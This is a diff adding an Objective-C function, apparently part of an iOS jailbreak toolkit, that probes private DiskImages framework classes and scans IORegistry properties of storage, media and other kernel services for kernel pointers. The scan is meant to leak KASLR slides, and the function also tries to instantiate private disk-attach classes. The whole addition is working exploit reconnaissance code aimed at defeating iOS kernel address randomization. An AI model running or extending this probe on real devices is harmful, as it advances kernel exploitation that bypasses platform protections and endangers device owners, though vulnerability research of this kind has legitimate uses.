@@ -44017,3 +44017,336 @@ void iosurface_sandbox_bypass(ISRLogBlock log, ISRDoneBlock done) {
         done(results);
     });
 }
+
+#pragma mark - JB61: Deep DiskImages + IORegistry KASLR Leak
+
+void iosurface_deep_diskimages(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+        log(@"JB61: === Deep DiskImages + IORegistry KASLR Leak ===");
+
+        dlopen("/System/Library/PrivateFrameworks/DiskImages.framework/DiskImages", RTLD_NOW);
+        dlopen("/System/Library/PrivateFrameworks/DiskImages2.framework/DiskImages2", RTLD_NOW);
+
+        typedef id(*msgsend_fn)(id, SEL, ...);
+        msgsend_fn msg = (msgsend_fn)dlsym(RTLD_DEFAULT, "objc_msgSend");
+
+        typedef void*(*matching_fn)(const char*);
+        typedef int(*getsvcs_fn)(unsigned int, void*, unsigned int*);
+        typedef unsigned int(*iternext_fn)(unsigned int);
+        typedef int(*regname_fn)(unsigned int, char*);
+        typedef void(*objrelease_fn)(unsigned int);
+        typedef int(*regcreate_fn)(unsigned int, void**, void*, unsigned int);
+
+        matching_fn sym_matching = (matching_fn)dlsym(RTLD_DEFAULT, "IOServiceMatching");
+        getsvcs_fn sym_getsvcs = (getsvcs_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingServices");
+        iternext_fn sym_next = (iternext_fn)dlsym(RTLD_DEFAULT, "IOIteratorNext");
+        regname_fn sym_regname = (regname_fn)dlsym(RTLD_DEFAULT, "IORegistryEntryGetName");
+        objrelease_fn sym_release = (objrelease_fn)dlsym(RTLD_DEFAULT, "IOObjectRelease");
+        regcreate_fn sym_regcreate = (regcreate_fn)dlsym(RTLD_DEFAULT, "IORegistryEntryCreateCFProperties");
+        typedef unsigned int(*svcgetmatching_fn)(unsigned int, void*);
+        svcgetmatching_fn sym_svcmatch = (svcgetmatching_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+
+        if (!msg || !sym_matching || !sym_getsvcs || !sym_next) {
+            results[@"verdict"] = @"NO_SYMBOLS"; done(results); return;
+        }
+
+        // Y1: Enumerate methods on key DiskImages classes
+        log(@"JB61: --- Y1: Key class method scan ---");
+        const char *keyClasses[] = {
+            "DIDiskImageBridge", "DIBlockDevice", "DIIOMedia",
+            "DIDeviceHandle", "DIImageHandle", "DICommonAttach",
+            "DiskImageParamsRAM_XPC", "DiskImageParamsRaw_XPC",
+            "BlankDiskImageCreator"
+        };
+        for (int c = 0; c < 9 && !isr_stopped(); c++) {
+            Class cls = NSClassFromString([NSString stringWithUTF8String:keyClasses[c]]);
+            if (cls) {
+                unsigned int mcount = 0;
+                Method *methods = class_copyMethodList(cls, &mcount);
+                log([NSString stringWithFormat:@"JB61: Y1 %s (%u methods):", keyClasses[c], mcount]);
+                if (methods) {
+                    for (unsigned int i = 0; i < mcount && i < 20; i++) {
+                        SEL sel = method_getName(methods[i]);
+                        const char *enc = method_getTypeEncoding(methods[i]);
+                        log([NSString stringWithFormat:@"JB61: Y1   [%u] %s enc=%s", i, sel_getName(sel), enc ? enc : "?"]);
+                    }
+                    if (mcount > 20) {
+                        log([NSString stringWithFormat:@"JB61: Y1   ... +%u more", mcount - 20]);
+                    }
+                    free(methods);
+                }
+                unsigned int cmcount = 0;
+                Method *cmethods = class_copyMethodList(object_getClass(cls), &cmcount);
+                if (cmethods && cmcount > 0) {
+                    for (unsigned int i = 0; i < cmcount && i < 10; i++) {
+                        log([NSString stringWithFormat:@"JB61: Y1   +[%u] %s", i, sel_getName(method_getName(cmethods[i]))]);
+                    }
+                    free(cmethods);
+                }
+            } else {
+                log([NSString stringWithFormat:@"JB61: Y1 %s NOT FOUND", keyClasses[c]]);
+            }
+        }
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // Y2: IORegistry properties of IOBlockStorageDevice entries (KASLR leak hunt)
+        log(@"JB61: --- Y2: IOBlockStorageDevice registry properties ---");
+        int y2_leaked = 0;
+        if (sym_regcreate) {
+            unsigned int iter = 0;
+            int kr = sym_getsvcs(0, sym_matching("IOBlockStorageDevice"), &iter);
+            if (kr == 0 && iter) {
+                unsigned int svc;
+                while ((svc = sym_next(iter)) != 0 && !isr_stopped()) {
+                    char nm[256] = {0};
+                    sym_regname(svc, nm);
+                    void *props = NULL;
+                    int pr = sym_regcreate(svc, &props, NULL, 0);
+                    if (props) {
+                        NSDictionary *dict = (__bridge_transfer NSDictionary *)props;
+                        log([NSString stringWithFormat:@"JB61: Y2 '%s' kr=%d keys=%lu", nm, pr, (unsigned long)dict.count]);
+                        for (NSString *key in dict) {
+                            id val = dict[key];
+                            if ([val isKindOfClass:[NSNumber class]]) {
+                                uint64_t v = [val unsignedLongLongValue];
+                                if (v > 0xffff000000000000ULL || (v > 0xfffffff000000000ULL && v < 0xfffffffffffffffeULL)) {
+                                    y2_leaked++;
+                                    log([NSString stringWithFormat:@"JB61: Y2 KERNEL PTR? %@=0x%llx", key, v]);
+                                }
+                            }
+                            if ([val isKindOfClass:[NSData class]]) {
+                                NSData *d = val;
+                                if (d.length >= 8) {
+                                    const uint8_t *bytes = d.bytes;
+                                    for (NSUInteger off = 0; off + 8 <= d.length && off < 128; off += 8) {
+                                        uint64_t v = 0;
+                                        memcpy(&v, bytes + off, 8);
+                                        if (v > 0xfffffff000000000ULL && v < 0xfffffffffffffffeULL) {
+                                            y2_leaked++;
+                                            log([NSString stringWithFormat:@"JB61: Y2 DATA PTR? %@[%lu]=0x%llx", key, (unsigned long)off, v]);
+                                        }
+                                    }
+                                }
+                            }
+                            NSString *desc = [NSString stringWithFormat:@"%@", val];
+                            if (desc.length > 200) desc = [desc substringToIndex:200];
+                            log([NSString stringWithFormat:@"JB61: Y2   %@ = %@", key, desc]);
+                        }
+                    } else {
+                        log([NSString stringWithFormat:@"JB61: Y2 '%s' no props (kr=%d)", nm, pr]);
+                    }
+                    sym_release(svc);
+                }
+                sym_release(iter);
+            }
+        }
+        results[@"y2_leaked"] = @(y2_leaked);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // Y3: IORegistry properties of IOMedia entries
+        log(@"JB61: --- Y3: IOMedia registry properties ---");
+        int y3_leaked = 0;
+        if (sym_regcreate) {
+            unsigned int iter = 0;
+            int kr = sym_getsvcs(0, sym_matching("IOMedia"), &iter);
+            if (kr == 0 && iter) {
+                unsigned int svc;
+                int mediaIdx = 0;
+                while ((svc = sym_next(iter)) != 0 && mediaIdx < 5 && !isr_stopped()) {
+                    char nm[256] = {0};
+                    sym_regname(svc, nm);
+                    void *props = NULL;
+                    int pr = sym_regcreate(svc, &props, NULL, 0);
+                    if (props) {
+                        NSDictionary *dict = (__bridge_transfer NSDictionary *)props;
+                        log([NSString stringWithFormat:@"JB61: Y3 [%d] '%s' kr=%d keys=%lu", mediaIdx, nm, pr, (unsigned long)dict.count]);
+                        for (NSString *key in dict) {
+                            id val = dict[key];
+                            if ([val isKindOfClass:[NSNumber class]]) {
+                                uint64_t v = [val unsignedLongLongValue];
+                                if (v > 0xfffffff000000000ULL && v < 0xfffffffffffffffeULL) {
+                                    y3_leaked++;
+                                    log([NSString stringWithFormat:@"JB61: Y3 KERNEL PTR? %@=0x%llx", key, v]);
+                                }
+                            }
+                            if ([val isKindOfClass:[NSData class]]) {
+                                NSData *d = val;
+                                if (d.length >= 8) {
+                                    const uint8_t *bytes = d.bytes;
+                                    for (NSUInteger off = 0; off + 8 <= d.length && off < 128; off += 8) {
+                                        uint64_t v = 0;
+                                        memcpy(&v, bytes + off, 8);
+                                        if (v > 0xfffffff000000000ULL && v < 0xfffffffffffffffeULL) {
+                                            y3_leaked++;
+                                            log([NSString stringWithFormat:@"JB61: Y3 DATA PTR? %@[%lu]=0x%llx", key, (unsigned long)off, v]);
+                                        }
+                                    }
+                                }
+                            }
+                            NSString *desc = [NSString stringWithFormat:@"%@", val];
+                            if (desc.length > 120) desc = [desc substringToIndex:120];
+                            log([NSString stringWithFormat:@"JB61: Y3   %@ = %@", key, desc]);
+                        }
+                    }
+                    mediaIdx++;
+                    sym_release(svc);
+                }
+                sym_release(iter);
+            }
+        }
+        results[@"y3_leaked"] = @(y3_leaked);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // Y4: IORegistry properties of IODiskImageBlockStorageDeviceInKernel
+        log(@"JB61: --- Y4: Disk image kernel device properties ---");
+        int y4_leaked = 0;
+        {
+            unsigned int svc = (unsigned int)(uintptr_t)sym_svcmatch(0, sym_matching("IODiskImageBlockStorageDeviceInKernel"));
+            if (svc) {
+                log([NSString stringWithFormat:@"JB61: Y4 svc=%u", svc]);
+                if (sym_regcreate) {
+                    void *props = NULL;
+                    sym_regcreate(svc, &props, NULL, 0);
+                    if (props) {
+                        NSDictionary *dict = (__bridge_transfer NSDictionary *)props;
+                        log([NSString stringWithFormat:@"JB61: Y4 keys=%lu", (unsigned long)dict.count]);
+                        for (NSString *key in dict) {
+                            id val = dict[key];
+                            if ([val isKindOfClass:[NSNumber class]]) {
+                                uint64_t v = [val unsignedLongLongValue];
+                                if (v > 0xfffffff000000000ULL && v < 0xfffffffffffffffeULL) {
+                                    y4_leaked++;
+                                    log([NSString stringWithFormat:@"JB61: Y4 KERNEL PTR! %@=0x%llx", key, v]);
+                                }
+                            }
+                            if ([val isKindOfClass:[NSData class]]) {
+                                NSData *d = val;
+                                if (d.length >= 8) {
+                                    const uint8_t *bytes = d.bytes;
+                                    for (NSUInteger off = 0; off + 8 <= d.length && off < 128; off += 8) {
+                                        uint64_t v = 0;
+                                        memcpy(&v, bytes + off, 8);
+                                        if (v > 0xfffffff000000000ULL && v < 0xfffffffffffffffeULL) {
+                                            y4_leaked++;
+                                            log([NSString stringWithFormat:@"JB61: Y4 DATA PTR! %@[%lu]=0x%llx", key, (unsigned long)off, v]);
+                                        }
+                                    }
+                                }
+                            }
+                            NSString *desc = [NSString stringWithFormat:@"%@", val];
+                            if (desc.length > 200) desc = [desc substringToIndex:200];
+                            log([NSString stringWithFormat:@"JB61: Y4   %@ = %@", key, desc]);
+                        }
+                    } else {
+                        log(@"JB61: Y4 no properties returned");
+                    }
+                }
+                sym_release(svc);
+            } else {
+                log(@"JB61: Y4 IODiskImageBlockStorageDeviceInKernel not found");
+            }
+        }
+        results[@"y4_leaked"] = @(y4_leaked);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // Y5: Try DIDiskImageBridge / DICommonAttach for direct kernel path
+        log(@"JB61: --- Y5: DIDiskImageBridge direct attach ---");
+        int y5_ok = 0;
+        {
+            Class bridgeClass = NSClassFromString(@"DIDiskImageBridge");
+            if (bridgeClass) {
+                @try {
+                    id bridge = [[bridgeClass alloc] init];
+                    if (bridge) {
+                        log([NSString stringWithFormat:@"JB61: Y5 bridge created: %@", [bridge class]]);
+                        y5_ok = 1;
+                    }
+                } @catch (NSException *ex) {
+                    log([NSString stringWithFormat:@"JB61: Y5 bridge init exception: %@", ex.reason]);
+                }
+            }
+
+            Class commonClass = NSClassFromString(@"DICommonAttach");
+            if (commonClass) {
+                @try {
+                    id common = [[commonClass alloc] init];
+                    if (common) {
+                        log([NSString stringWithFormat:@"JB61: Y5 commonAttach created: %@", [common class]]);
+                    }
+                } @catch (NSException *ex) {
+                    log([NSString stringWithFormat:@"JB61: Y5 commonAttach exception: %@", ex.reason]);
+                }
+            }
+        }
+        results[@"y5_bridge"] = @(y5_ok);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // Y6: IORegistry scan for ALL services with kernel pointer values
+        log(@"JB61: --- Y6: Broad IORegistry kernel pointer scan ---");
+        int y6_leaked = 0;
+        {
+            const char *scanClasses[] = {
+                "IOSurfaceRoot", "IOHDIXController",
+                "AppleAPFSContainer", "AppleAPFSScheme",
+                "IONVMeController", "AppleARMIODevice"
+            };
+            for (int c = 0; c < 6 && !isr_stopped(); c++) {
+                unsigned int svc = (unsigned int)(uintptr_t)sym_svcmatch(0, sym_matching(scanClasses[c]));
+                if (svc && sym_regcreate) {
+                    void *props = NULL;
+                    sym_regcreate(svc, &props, NULL, 0);
+                    if (props) {
+                        NSDictionary *dict = (__bridge_transfer NSDictionary *)props;
+                        log([NSString stringWithFormat:@"JB61: Y6 %s keys=%lu", scanClasses[c], (unsigned long)dict.count]);
+                        for (NSString *key in dict) {
+                            id val = dict[key];
+                            if ([val isKindOfClass:[NSNumber class]]) {
+                                uint64_t v = [val unsignedLongLongValue];
+                                if (v > 0xfffffff000000000ULL && v < 0xfffffffffffffffeULL) {
+                                    y6_leaked++;
+                                    log([NSString stringWithFormat:@"JB61: Y6 PTR! %s.%@=0x%llx", scanClasses[c], key, v]);
+                                }
+                            }
+                            if ([val isKindOfClass:[NSData class]]) {
+                                NSData *d = val;
+                                if (d.length >= 8 && d.length <= 256) {
+                                    const uint8_t *bytes = d.bytes;
+                                    for (NSUInteger off = 0; off + 8 <= d.length; off += 8) {
+                                        uint64_t v = 0;
+                                        memcpy(&v, bytes + off, 8);
+                                        if (v > 0xfffffff000000000ULL && v < 0xfffffffffffffffeULL) {
+                                            y6_leaked++;
+                                            log([NSString stringWithFormat:@"JB61: Y6 DATA! %s.%@[%lu]=0x%llx", scanClasses[c], key, (unsigned long)off, v]);
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    sym_release(svc);
+                }
+            }
+        }
+        results[@"y6_leaked"] = @(y6_leaked);
+
+        // Verdict
+        int total_leaked = y2_leaked + y3_leaked + y4_leaked + y6_leaked;
+        NSString *verdict = @"NO_LEAK";
+        if (total_leaked > 0) {
+            verdict = [NSString stringWithFormat:@"KASLR_LEAK_%d", total_leaked];
+        } else if (y5_ok) {
+            verdict = @"BRIDGE_OK";
+        }
+        results[@"verdict"] = verdict;
+        results[@"total_leaked"] = @(total_leaked);
+        log([NSString stringWithFormat:@"JB61: Verdict: %@", verdict]);
+        isr_checkpoint(@"JB61-deep-diskimages-checkpoint.json", results);
+        done(results);
+    });
+}
